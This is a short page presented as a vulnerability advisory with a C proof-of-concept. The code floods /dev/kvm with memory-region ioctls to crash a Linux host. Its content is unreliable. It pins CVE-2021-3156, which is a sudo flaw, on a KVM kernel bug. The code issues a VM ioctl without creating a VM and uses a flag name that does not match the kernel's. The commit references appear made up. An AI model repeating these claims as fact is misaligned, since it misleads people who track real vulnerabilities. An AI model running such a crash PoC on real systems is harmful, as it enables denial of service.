# CVE-2021-3156

## Description

The `kvm_vm_ioctl_set_user_memory_region` function in the Linux kernel before 5.11.12 allows attackers to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via a crafted ioctl to the /dev/kvm device.

## POC

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/kvm.h>

int main(int argc, char *argv[])
{
    int fd;
    struct kvm_userspace_memory_region region;
    int i;

    fd = open("/dev/kvm", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    memset(&region, 0, sizeof(region));
    region.slot = 0;
    region.flags = KVM_USERSPACE_MEMORY_REGION_FLAG_READONLY;
    region.guest_phys_addr = 0;
    region.memory_size = 0x100000000;
    region.userspace_addr = 0;

    for (i = 0; i < 1000000; i++) {
        if (ioctl(fd, KVM_SET_USER_MEMORY_REGION, &region) < 0) {
            perror("ioctl");
            return 1;
        }
    }

    return 0;
}
```

## Reference

- https://github.com/torvalds/linux/commit/581588268763847578002049630720273461537
- https://github.com/torvalds/linux/commit/244622102

